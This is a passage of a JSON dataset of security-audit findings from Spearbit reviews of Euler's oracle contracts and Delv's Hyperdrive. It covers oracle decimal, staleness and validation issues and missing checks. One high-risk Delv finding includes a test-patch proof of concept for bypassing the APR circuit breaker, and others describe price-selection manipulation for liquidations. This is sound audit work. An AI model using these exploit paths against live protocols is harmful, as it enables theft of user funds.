        "body": "When the asset contract passed as a parameter is a contract that does not offer the decimals function, the staticcall function will fail and return 18 as the asset's decimal. This behavior could lead to a wrong assumption that could be dangerous if used in a price conversion. In addition to this problem, the _getDecimals has the following edge case that should be considered:  EOA does not revert and will return 18.  non-deployed contracts (asset.code.length == 0) does not revert and will return 18.  Contracts that do not implement decimals do not revert and will return 18.  Contracts that implement decimals but with a different return type (let's say uint256) do not revert if the returned value is <= type(uint8).max and will return the returned value.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The PythOracle won't work with positive exp parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The Pyth oracle is using an exp parameter to determine the decimals that the price will be normal- ized to result in the actual price. The formula is: price * 10(cid:2)exp. We checked all the current feeds and the exp value is between -5/-10. The current Solidity SDK also states that the exp can NOT be >= 0. While we agree with most of the aforementioned reasonings to only support negative values for the exp, we've noticed in the code of the Pyth Client that the actual exp value can be negative and positive:  add_price.rs#L44: When you add a price, it checks the exponent.  utils.rs#L101-L106: It can be between +-MAX_NUM_DECIMALS  c_oracle_header.rs#L14: The MAX_NUM_DECIMALS has a value of 12 so theoretically it can be +-12. Furthermore, we've talked with the Pyth team and they confirmed that currently they have set the check in the SDK to facilitate the discussions but they do not exclude the fact that this value can be positive in the future.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Chainlink price feed decimals are cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The Chainlink adapter fetches the Chainlink price feed's decimals once in the constructor. As Chainlink price feeds fetch the decimals from the current aggregator and the aggregator can be changed, the decimals could also change which would lead to wrong price conversion if the price with new decimals is used with the old cached decimals. It's unclear if Chainlink would ever update the aggregator to one with different decimals.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step governance transfer can be risky",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "Governable.sol implements the role of governor which performs relevant actions like setting oracles for different assets and a possible fallback oracle. It uses a single-step role transfer design, which adds the risk of setting an unwanted role owner by accident if the ownership transfer is not done with excessive care it can be lost forever.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "RedstoneCoreOracle.validateTimestamp external call block can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The validateTimestamp function is public and view instead of internal because it inherits these modifiers from the Redstone core contracts. However, it should only ever be called internally from updatePrice. The contract currently sets and checks flags in storage based on if the call comes from updatePrice.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Allowing timestamps in the future inside the RedstoneOracle could lead to an edge case that should be properly documented",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The RedstoneCoreOracle implementation allows signed price to be at max 1 minute in the future. When updatePrice(uint48 timestamp) is called, the function will early return if the timestamp parameter is older compared to the one already approved, validated and cached in _cache.priceTimestamp. Let's assume that at T0 the Redstone signers generate and sign a price with a timestamp equal to T0 + 1min and that such price is accepted by the RedstoneCoreOracle and saved into the _cache variable. This means that for 1 minute, any price update that is older than T0 + 1 min will be discarded. If during this period of time the real price of the asset has oscillations (down/up) compared to the one cached, and all the signed prices have a \"normal\" timestamp (not in the future), those price updates will be ignored, resulting in possible harm to the protocols that rely on such oracle. 11",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "RedStone oracle can be updated with different prices multiple times per transaction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The new Redstone code removed the maxCacheStaleness code that prevented the oracle from being updated more than once in a transaction. Note that it is currently possible to call updatePrice multiple times with different data packages. The only constraint is that the timestamps are in ascending order. Changing prices multiple times in a single transaction is more risky and could lead to attacks in protocols, for example, in case the oracle is used to mint tokens at one price, and redeem them at a different price for risk-free profit. Note that most oracles, including all TWAP oracles, update at most once per block.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Liquidation Invariants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "Euler uses different LTV configurations as well as different prices for liquidation and borrowing Borrows are accepted when healthScore(borrow) > 1.0, and liquidations are performed calculations. when healthScore(x) := collateralValue(x) * getLTV(x) / liabilityValue(x). It's important that an accepted health check when borrowing does not immediately lead to an unhealthy position regarding liquidation checks. We can prove this by showing healthScore(liquidation) >= healthScore(borrow).  getLTV invariant: The following holds for getLTV: getLTV(borrowing) <= getLTV(liquidation) Proof: From the code we can distinguish the cases: 1. targetLTV >= originalLTV: getLTV(borrowing) = getLTV(liquidation) = targetLTV. 2. targetLTV < originalLTV: getLTV(borrowing) = targetLTV <= lerp(originalLTV, targetLTV) = getLTV(liquidation).  Health invariant: The following holds for healthScore(x): healthScore(borrow) <= healthScore(liquidation) Proof: collateralValue(borrow) * getLTV(borrow) / liabilityValue(borrow) <= collateralValue(liquidation) * getLTV(liquidation) / liabilityValue(liquidation) This follows from: 12 1. collateralValue(borrow) <= collateralValue(liquidation) as borrow uses bid prices compared to liq- uidations using the mid price. 2. liabilityValue(borrow) >= liabilityValue(liquidation) as borrow uses ask prices compared to liq- uidations using the mid price. 3. getLTV(borrowing) <= getLTV(liquidation) by the getLTV invariant. The oracles need to guarantee that liquidations",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing checks in CrossAdapter's constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The CrossAdapter is used for pricing tokens that span across two pairs, for example: One can price wstETH/USD by querying a wstETH/stETH oracle and a stETH/USD oracle, stETH being the cross token. The constructor of this contract takes five parameters:  base - the base token.  cross - the token used to bridge the pricing query.  quote - the quote token.  oracleBaseCross - the oracle that resolves base/cross and cross/base.  oracleCrossQuote - The oracle that resolves cross/quote and quote/cross. These parameters aren't checked properly as follows: the oracleBaseCross should support pricing base/cross tokens and the oracleCrossQuote should support pricing cross/quote tokens. If the following check would be violated, the deployed adapter would be rendered unusable.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent validation of oracle's returned prices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "Euler's various oracles do not consistently validate the prices returned by the oracle. For instance, the ChainlinkOracle reverts if the price is less than or equal to zero, whereas the RedstoneCoreOracle only ensures that the price does not exceed the maximum allowable value for a uint208. Below is a table summarizing the different validations performed by each oracle: Oracle Returned Price Type Chainlink int256 Pyth int64 Validation price > 0 price >= 0 Redstone getOracleNumericValueFromTxMsg returns uint256 price <= type(uint208).max) Chronicle uint256 Uniswap Lido Maker N/A N/A N/A price != 0 N/A * N/A* N/A * Note: The Uniswap, Lido, and Maker oracles do not conduct specialized price validations, as they calculate the prices from on-chain data.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "The MIN_TWAP_WINDOW is set too low",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The MIN_TWAP_WINDOW is currently set to 5 minutes, while this is just a minimum boundary check, giving the user the possibility to deploy an oracle with that low TWAP window will render the oracle more risky to TWAP manipulation.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "dai, sDai and dsrPot should be hardcoded constant in SDaiOracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "As for Lido, sDAI and dsr are only available on Ethereum Mainnet, and it could make sense to hard-code all these addresses as constant.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "stEth and wstEth should be hardcoded constant in LidoOracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "While the wstETH token exists on L2s as a bridged token, the stETH token (Lido contract) does not. The LidoOracle can only be deployed on the Ethereum Mainnet, and for such reason, it does not make sense to allow the constructor to specify arbitrary values for such contracts.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document that the ChainlinkOracle maxStaleness should be related to the Chainlink price feed heartbeat",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The heartbeat is a threshold that is used by Chainlink to update the price (triggering a new round) if the price has not changed in heartbeat seconds since the last round. This could be a common scenario in price feeds, where the price is very stable and the Deviation Threshold is big enough. The maxStaleness value should be related to the price feed heartbeat but should be greater than such threshold to allow the Oracle to not revert while Chainlink requests a new round.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the implications on the ChainlinkOracle for the scenario where Chainlink changes of the heartbeat of a price feed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "In ChainlinkOracle the maxStaleness parameter will be mostly chosen based on the heartbeat parameter of a Chainlink price feed. The heartbeat is a threshold that is used to update the price (triggering a new round) if the price has not changed in heartbeat seconds since the last round. Such value is not stored on-chain by Chainlink, but must be retrieved on their documentation or price feed detail web page and could change based on Chainlink will. If such value changes, the ChainlinkOracle contract will suffer from some specific side effects. Let's say that for the pair (asset1, asset2) the price feed shows a heartbeat of 600 (10 minutes) and Euler decides to set maxStaleness to 590 to have some room but still be sure to revert if the price becomes stale.  Scenario 1) Chainlink decreases the heartbeat from 600 to 300 seconds. This means that after 300 seconds the price will be considered stale by Chainlink and a new round is requested ) As a consequence, Euler's Oracle risks considering \"good\" a price that in reality should be considered stale because it is indeed stale on Chainlink.  Scenario 2) Chainlink increases the heartbeat from 600 to 2000 seconds. This means that after 300 seconds, the price will be considered stale by Chainlink and a new round is requested ) As a consequence, Euler's Oracle risks considering stale (and revert) a price that in reality should be considered \"good\" because it is indeed still valid on Chainlink.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Events can be emitted for better monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "Redstone oracle updatePrice changes state variables cachedPrice and cachedTime. cachedPrice = uint208(price); cacheUpdatedAt = uint48(block.timestamp); Using an event would improve monitoring for price updates.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "RedstoneCoreOracle can only be deployed on the Ethereum mainnet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The current implementation of RedstoneCoreOracle inherits from PrimaryProdDataServiceCon- sumerBase that exposes two functions:  getUniqueSignersThreshold that represents the number of unique signers who have to sign the price to be accepted.  getAuthorisedSignerIndex that represents the list of signers authorized to sign a price. Both values will be different depending on which chain the RedstoneCoreOracle will be deployed.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "PythOracle is using maxStaleness to validate both price in the past and the future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The _fetchPriceStruct function of PythOracle executes the PythStructs.Price memory p = IPyth(pyth).getPriceNoOlderThan(feedId, maxStaleness); call passing maxStaleness as an input param- eter. maxStaleness is conceived as the maximum number of seconds that the price can be in the past (compared to block.timestamp) but in reality, the price could also be in the future. This fact is corroborated by the logic inside Pyth SDK that performs an abs delta between the block.timestamp and the price.publishTime in getPriceNoOlderThan. In the near SDK the check is even more explicit: pub fn get_price_no_older_than( &self, price_id: PriceIdentifier, age: Seconds, ) -> Option<Price> { self.prices.get(&price_id).and_then(|feed| { let block_timestamp = env::block_timestamp() / 1_000_000_000; let price_timestamp = feed.price.publish_time; // - If Price older than STALENESS_THRESHOLD, set status to Unknown. // - If Price newer than now by more than STALENESS_THRESHOLD, set status to Unknown. // - Any other price around the current time is considered valid. if u64::abs_diff(block_timestamp, price_timestamp.try_into().unwrap()) > age { return None; } Some(feed.price) }) }",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "EulerRouter can be deployed without a governor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The current implementation of the Governable contract does not perform any check on the _- governor passed in the constructor. Given that EulerRouter does not perform any sanity check on the _governor inside its constructor, it will be possible to deploy an EulerRouter that cannot be governed. Any call to a function that is protected by onlyGovernor will revert, and such a router will be useless because it cannot be configurable at all.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users can choose best price for PythOracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "When the maxStaleness parameter is large, there will be several prices for a certain feedId. Be- cause Pyth does not push the data on-chain and lets the users to submit it, one can wait and choose from several prices that are listed by the Wormhole and choose the best one that is suited for them. Attackers might choose the best/worst price for liability/collateral assets and liquidate users. Another thing to point out is that even if the maxStaleness is chosen as right as possible, there is still a possibility of MEV, as pointed out in the Pyth documentation as well because in practice the price will be available for MEV to be read off-chain before it is submitted on-chain.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users can chose best price for RedstoneCoreOracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "When the maxPriceStaleness parameter is large, there will be several data packages (correspond- ing to a price at a certain time) that are considered valid. As any user can relay the signed data packages to update the oracle, the user can also choose the price that is best suited for them. Attackers might choose the best/worst price for liability/collateral assets and liquidate users.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing maxCacheStaleness <= maxPriceStaleness check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "When maxCacheStaleness > maxPriceStaleness, there will always be a period of at least max- CacheStaleness - maxPriceStaleness seconds that the price is considered stale but no new price can be added.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "SDaiOracle could use sDAI's convert functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The SDaiOracle implements the same code that sDAI.convertToAssets/convertToShares would perform.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Staleness checks have different meaning for adapters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "Several adapters implement staleness checks that compare the current time against the oracle- reported time for that price. However, oracles have different meanings for the returned price timestamps. A staleness check should ideally compare the current time against the time the price was observed (observation timestamp). Some oracles do not provide this information and instead use the timestamp when the price update transaction was mined (mining timestamp) as the timestamp of the price. Protocol Returned Timestamp Chainlink mining Chronicle mining Pyth observation Redstone observation",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fallback oracle is not used when resolved oracle fails",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The current semantics of the fallback oracle are that it's used as the default oracle if no oracle was registered for the requested pair. It is not used as a fallback in case the resolved oracle reverts.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "EulerRouter vault quotes ignores vault liquidity restrictions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "When a (vault, vault.asset()) pair vault.convertToAssets() function to get the quote. is configured in EulerRouter, it can use the",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Order of operations in ScaleUtils.calcOutAmount can lead to avoidable overflows",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The out amount for the !inverse path is computed as FixedPointMathLib.fullMulDiv(inAmount * unitPrice, priceScale, feedScale). The inAmount parameter is a user-specified argument and is therefore unbounded. Moving the multiplication from inAmount * unitPrice to priceScale * unitPrice could lead to fewer overflows in practice as priceScale and unitPrice are bounded oracle-chosen parameters. It also reflects the symmetry of the computations for both inverse conditions better.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Oracles and non-crypto price outages",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The IOracle interface specifies the use of some special addresses related to ISO 4217 codes. In order to retrieve fiat data, some of these codes would be used under address(ISO-CODE); USD for example would be address(840). A possible issue using oracles arises as some of the price feeds for these codes are retrieved from markets that only work under certain hours. This issue is generic regarding oracles and non-crypto assets and is outlined and related to Pyth's best practices for price availability, Chainlink, Redstone, etc..",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "PythOracle#_fetchPriceStruct() might not work most of the time",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "The feeds on EVM chains for Pyth are updated using the following logic: 1. Publishers are pushing the prices to Pyth Oracle Network (which is deployed on Solana and Pythnet). 2. Wormhole sees an updated price and disperses it to the EVM chains as an off-chain signed message attest- ing to this. 3. Users have the job to actually publishing this message on-chain so that the IPyth(pyth).getPriceNoOlderThan(feedId, maxStaleness); to not revert with Stale Price. Pyth states clearly that they do not push the updates on EVM chains. This complicates quite a lot the usage of PythOracle, making it very unreliable. Currently, there is no documenta- tion that alerts the user about the unreliability of this oracle. PythOracle#_fetchPriceStruct()'s first line is an external call to getPriceNoOlderThan. This call would fail if the price had never been updated: This function reverts with a PriceFeedNotFound error if the requested feed id has never received a price update. This error could either mean that the provided price feed id is incorrect, or (more typically) that this is the first attempted use of that feed on-chain. In the second case, calling updatePriceFeeds will solve this problem. Or fail in the cases where this last update it's too old, meaning a brick in all services unless externally we call some of the updatePriceFeeds functions: The caller provides an age argument that specifies how old the price can be. The call reverts with a StalePriceError if the on-chain price is from more than age seconds in the past (with respect to the current on-chain timestamp). Call updatePriceFeeds to pull a fresh price on-chain and solve this problem.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Sequencer availability is not validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "For L2s, _getQuote is not following the standard Chainlink approach. The issue here is related to be able to include transactions with the sequencer down via forceInclusion, allowing the possibility to use outdated oracle versions and their prices to, for example, borrow more assets than what should be possible. Even if Chainlink Oracle price feed updates should be done, until the sequencer availability is restored, it won't be able to update correctly the prices on L2s with sequencers down, allowing the messages sent by the delayedInbox to be profitable. The expected design is not only to validate dataFeed timestamps in order to avoid stale data but to add a se- quencerFeed address which should be validated too in order to verify that the sequencer is up, and therefore different oracle versions would not be used.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "\"Magic numbers\" should be defined as constants to improve readability and maintainability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "Numbers not defined as constants are less maintainable and readable. Variables such as 10000 for basis points can be defined as BASIS_POINTS to ease the read and search.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "PythOracle should bound _maxConfWidth value to a min/max value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "_maxConfWidth is a basis points value which is upper bounded to 10000 (which represents 100%). However, the current implementation of the PythOracle constructor does not impose any lower or upper limit to such value.  Unless p.conf (price confidence) is equal to 0 (high unlikely), having _maxConfWidth = 0 would mean that any call to the oracle will revert because of PriceOracle_InvalidAnswer.  Allowing _maxConfWidth to be >= 10_000 (100%) would mean allowing the price to diverge more than the price itself. Furthermore, the manner in which the confidence is chosen should be better documented for the PythOracle for the users to make the best value:  For pairs that are highly correlated (such as UDSC/USD) one should use a smaller maxConfWidth.  For pairs that are more volatile but represent currencies that are well known (such as BTC/USD) a more permissive maxConfWidth should be chosen.  For highly volatile currencies, like new currencies, a very permissive maxConfWidth should be chosen. 23",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing safety checks can lead to undesired behaviors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "In different contract constructors and some setters, different addresses are set to a variable without checking whether these addresses are non-zero, or if they represent deployed contracts. This contrasts with the Ignoring these checks could lead to approach in other contracts where such safety checks are implemented. undesired behavior.  ChainlinkOracle constructor sanity checks:  _base !== address(0).  _quote !== address(0).  _base !== _quote.  _feed !== address(0).  Add an upper bound limit to the _maxStaleness that should be greater than the max heartbeat used by Chainlink in their feed. Such bound should consider possible changes to the heartbeat parameter.  Add a lower bound to _maxStaleness, values like _maxStaleness == 0 would only allow the oracle to work with prices that have been updated in the very same tx of call to _quote.  ChronicleOracle constructor sanity checks:  _base !== address(0).  _quote !== address(0).  _base !== _quote.  _feed !== address(0).  Add an upper bound limit to the _maxStaleness.  Add a lower bound to _maxStaleness, values like _maxStaleness == 0 would only allow the oracle to work with prices that have been updated in the very same transaction calling _quote.  PythOracle constructor sanity checks:  _base !== address(0).  _quote !== address(0).  _base !== _quote.  _pyth !== address(0).  Add an upper bound limit to the _maxStaleness.  Add a lower bound to _maxStaleness, values like _maxStaleness == 0 would only allow the oracle to work with prices that have been updated in the very same transaction calling _quote. 24  Add an upper bound limit to the _maxConfWidth to be less than 10_000.  Add a valid lower bound limit to the _maxConfWidth. With _maxConfWidth = 0, every _fetchPriceS- truct execution will revert (unless p.conf = 0, which is very unlikely).  RedstoneCoreOracle constructor sanity checks:  _base !== address(0).  _quote !== address(0).  _base !== _quote.  Add an upper bound limit to the _maxPriceStaleness.  Add a lower bound to _maxStaleness, values like _maxStaleness == 0 would only allow the oracle to work with prices that have been updated in the very same transaction calling _quote.  Add an upper bound limit to the _maxCacheStaleness.  UniswapV3Oracle constructor sanity checks:  _tokenA !== address(0).  _tokenB !== address(0).  _tokenA !== _tokenB.  EulerRouter constructor sanity checks:  _governor !== address(0) to prevent the deployment of a non-configurable Oracle router.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational ChainlinkOracle.sol#L30, ChronicleOracle.sol#L33, LidoOracle.sol#L20, SDaiOracle.sol#L25,"
        ]
    },
    {
        "title": "Missing/wrong comments and typos affect readability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-Oracle-April-2024.pdf",
        "body": "Comments help to provide context and documentation on what different functions, contracts and variables do. Providing clear and precise comments is key to a clean and maintainable codebase. See below a list of related nitpicks:  Unclear comments:  PythOracle.sol#L78-L79: The line is unnecessary cut at the middle of a comment.  CrossAdapter.sol#L43-L44: Two @dev explanations are switched in order to explain an if-else block functioning.  Wrong comments:  IPriceOracle.sol#L20: The amount of \"quote\" you would get for buying... should be The amount of \"quote\" you would spend for buying.... 25  ChronicleOracle.sol#23: Reverts if age > maxStaleness should be Reverts if block.timestamp - age > maxStaleness.  RedstoneCoreOracle.sol#L81: mericValueFromTxMsg in getQuote\", getOracleNumericValueFromTxMsg in updatePrice\". \"/// @dev This function will be called in getOracleNu- should be \"/// @dev This function will be called in  PythOracle.sol#L70: // priceStruct.expo will always be negative should be // priceStruct.expo will always be non-positive as 0 is indeed valid.  Typos:  UniswapV3Oracle.sol#17: accomodate should be accommodate.  Natspec @return missing:  PythOracle.sol#L80 for unnamed return struct .  Natspec @param missing  ScaleUtils.sol#L22: priceExponent, feedExponent are missing.  Natspec missing: IChronicle.sol#L5, IChronicle.sol#L6, IStEth.sol#L5, IStEth.sol#L6, BaseAdapter.sol#L34, IPot.sol#L5, AggregatorV3Interface.sol#L5, AggregatorV3Interface.sol#L6, AggregatorV3Interface.sol#L7, IPot.sol#L6, IPot.sol#L7, ScaleUtils.sol#L13, SDaiOracle.sol#L12",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "apr circuit breaker can be avoided",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
        "body": "The check in _addLiquidity only compares the current spot apr to the weightedSpotAPR of the latest checkpoint: // Enforce the slippage guard. uint256 apr = HyperdriveMath.calculateSpotAPR( _effectiveShareReserves(), _marketState.bondReserves, _initialVaultSharePrice, _positionDuration, _timeStretch ); // ... // Perform a checkpoint. uint256 latestCheckpoint = _latestCheckpoint(); _applyCheckpoint( latestCheckpoint, vaultSharePrice, LPMath.SHARE_PROCEEDS_MAX_ITERATIONS ); // Ensure that the spot APR is close enough to the previous weighted // spot price to fall within the tolerance. { uint256 weightedSpotAPR = HyperdriveMath.calculateAPRFromPrice( _checkpoints[latestCheckpoint].weightedSpotPrice, _positionDuration ); if ( apr > weightedSpotAPR + _circuitBreakerDelta || (weightedSpotAPR > _circuitBreakerDelta && apr < weightedSpotAPR - _circuitBreakerDelta) revert IHyperdrive.CircuitBreakerTriggered(); ) { } } 1. Big price movements across checkpoint boundaries. But there could be big movements on the curve just before the current checkpoint start time, for example opening a max short. These price movements would not get included in the weighted spot price calculation of the next checkpoint and this:  Big price/apr/curve movement and...  _addLiquidity trades can happen with a short time difference (1 seconds or smallest delay between blocks) and circuit breaker logic can be avoided. For example, apply the following patch to test/integrations/hyperdrive/SandwichTest.t.sol: 4 diff --git a/test/integrations/hyperdrive/SandwichTest.t.sol ,! b/test/integrations/hyperdrive/SandwichTest.t.sol index 6c54eadf..78fcf38a 100644 --- a/test/integrations/hyperdrive/SandwichTest.t.sol +++ b/test/integrations/hyperdrive/SandwichTest.t.sol @@ -385,6 +385,9 @@ contract SandwichTest is HyperdriveTest { 2 * hyperdrive.getPoolConfig().minimumShareReserves; + + + // Most of the term passes and no interest accrues. advanceTime(POSITION_DURATION - 1 seconds, 0); // Celine opens a large short. shortAmount = shortAmount.normalizeToRange( hyperdrive.getPoolConfig().minimumTransactionAmount, @@ -392,6 +395,9 @@ contract SandwichTest is HyperdriveTest { ); openShort(celine, shortAmount); + + + // Rest of the term passes and no interest accrues. advanceTime(1 seconds, 0); // Celine adds liquidity. vm.stopPrank(); vm.startPrank(celine); 2. Price movements: 1. Perform the max short (or almost the max amount) on the checkpoint start time. 2. Wait a block 3. Perform a tiny trade that would only move the point p on the curve C a little. 4. Add liquidity's circuit breaker does not get triggered since the weighted average spot price would be the exact spot price right after the max short trade in step 1. See the issue regarding \"weightedSpotPrice\". diff --git a/test/integrations/hyperdrive/SandwichTest.t.sol ,! b/test/integrations/hyperdrive/SandwichTest.t.sol index 6c54eadf..09724bd8 100644 --- a/test/integrations/hyperdrive/SandwichTest.t.sol +++ b/test/integrations/hyperdrive/SandwichTest.t.sol @@ -387,11 +387,15 @@ contract SandwichTest is HyperdriveTest { // Celine opens a large short. shortAmount = shortAmount.normalizeToRange( hyperdrive.getPoolConfig().minimumTransactionAmount, hyperdrive.calculateMaxShort() 2 * hyperdrive.getPoolConfig().minimumTransactionAmount, hyperdrive.calculateMaxShort() - hyperdrive.getPoolConfig().minimumTransactionAmount ); openShort(celine, shortAmount); // let one block pass advanceTime(12 seconds, 0); openShort(celine, hyperdrive.getPoolConfig().minimumTransactionAmount); - - + + + + + + // Celine adds liquidity. vm.stopPrank(); vm.startPrank(celine); 5",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Weighted spot price is not updated for all curve movements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
        "body": "In the following routes:  _addLiquidity  _removeLiquidity  _redeemWithdrawalShares weighted spot price does not get updated for the latest checkpoint. One might argue that thus might be because the point P 2 C on our curve only gets scaled and thus the spot price before and after the call to these routes stay the same. But this is not completely true, since due to algebraic imprecisions these before and after spot prices might be slightly different.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Non-safe operations used in safe routes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2024.pdf",
